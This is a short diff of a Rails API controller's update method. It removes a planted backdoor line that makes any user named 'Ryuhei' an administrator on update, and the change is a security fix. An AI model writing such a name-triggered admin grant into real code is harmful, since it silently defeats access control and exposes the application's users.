@@ -27,7 +27,6 @@ module Api
 
       def update
         user = User.find(params[:id])
-        user.admin = true if user.name == 'Ryuhei'
 
         if user.update(user_params)
           render json: user.as_json(only: %i[id name email description], methods: [:image_url]), status: :ok
